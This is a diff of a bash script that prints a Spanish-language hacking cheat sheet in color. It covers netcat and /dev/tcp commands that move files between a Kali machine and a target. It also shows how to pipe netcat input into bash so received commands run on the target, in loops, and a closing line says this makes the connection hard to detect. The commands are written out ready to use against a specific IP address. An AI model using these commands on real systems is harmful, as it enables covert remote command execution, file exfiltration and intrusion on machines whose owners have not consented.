@@ -1,59 +1,50 @@
 #!/usr/bin/env bash
 
-echo '''
-#ir a extraction de mi pagina para comandos
+echo -e '\033[1;34m# Go to Extraction section on my page for commands\033[0m'
 
-# Enviar archivos con nc usando TCP
-# Original:
-# nc -nlvp 1234 < archivo
-# cat > archivo < /dev/tcp/$ip_kali/1234
+echo -e '\033[1;33m# Enviar archivos con nc usando TCP\033[0m'
+echo -e '\033[0;37m# Original:\033[0m'
+echo -e '\033[0;32mnc -nlvp 1234 < archivo\033[0m'
+echo -e '\033[0;32mcat > archivo < /dev/tcp/$ip_kali/1234\033[0m'
 
-# En Kali (escuchar y enviar archivo):
-nc -nlvp 1234 < archivo
+echo -e '\033[1;37m# En Kali (escuchar y enviar archivo):\033[0m'
+echo -e '\033[0;32mnc -nlvp 1234 < archivo\033[0m'
 
-# En la máquina que recibe:
-cat > archivo < /dev/tcp/$ip_kali/1234
+echo -e '\033[1;37m# En la máquina que recibe:\033[0m'
+echo -e '\033[0;32mcat > archivo < /dev/tcp/$ip_kali/1234\033[0m'
 
-# Verificar integridad:
-md5sum archivo
+echo -e '\033[1;37m# Verificar integridad:\033[0m'
+echo -e '\033[0;32mmd5sum archivo\033[0m'
 
-# --------------------------------------------------
+echo -e "\033[1;35m# --------------------------------------------------\033[0m"
 
-# Usar nc para enviar comandos o archivos:
+echo -e '\033[1;33m# Usar nc para enviar comandos o archivos:\033[0m'
+echo -e '\033[0;37m# Original:\033[0m'
+echo -e '\033[0;32mcat adios | nc -q 1 100.65.128.115 1234\033[0m'
 
-# Original:
-# cat adios| nc -q 1 100.65.128.115 1234
+echo -e '\033[1;37m# En Kali (envía el contenido de "adios" para ejecutarlo en destino):\033[0m'
+echo -e '\033[0;32mcat adios | nc -q 1 100.65.128.115 1234\033[0m'
 
-# En Kali (envía el contenido de "adios" para ejecutarlo en destino):
-cat adios | nc -q 1 100.65.128.115 1234
+echo -e '\033[1;37m# Ejemplo de contenido de "adios":\033[0m'
+echo -e '\033[0;32mnano adios\n# minet\033[0m'
 
-# Ejemplo de contenido de "adios":
-# nano adios
-# minet
+echo -e '\033[1;37m# En la máquina destino (Ubuntu) para ejecutar lo recibido:\033[0m'
+echo -e '\033[0;32mnc -l -p 1234 | bash\033[0m'
 
-# En la máquina destino (Ubuntu) para ejecutar lo recibido:
-# Original:
-# nc -l -p 1234 | bash
+echo -e "\033[1;35m# --------------------------------------------------\033[0m"
 
-# Escuchar y ejecutar automáticamente:
-nc -l -p 1234 | bash
+echo -e '\033[1;33m# Para enviar repetidamente en un loop:\033[0m'
 
-# --------------------------------------------------
-
-# Para enviar repetidamente en un loop:
-
-# En Kali:
-while true; do
+echo -e '\033[1;37m# En Kali:\033[0m'
+echo -e '\033[0;32mwhile true; do
     cat adios | nc -q 1 100.65.128.115 1234
     sleep 3
-done
+done\033[0m'
 
-# En Ubuntu para recibir y ejecutar en loop:
-while true; do
+echo -e '\033[1;37m# En Ubuntu para recibir y ejecutar en loop:\033[0m'
+echo -e '\033[0;32mwhile true; do
     nc -l -p 1234 | bash
     sleep 1
-done
+done\033[0m'
 
-# Así no se detecta fácil la conexión.
-
-'''
+echo -e '\033[1;31m# Así no se detecta fácil la conexión.\033[0m'
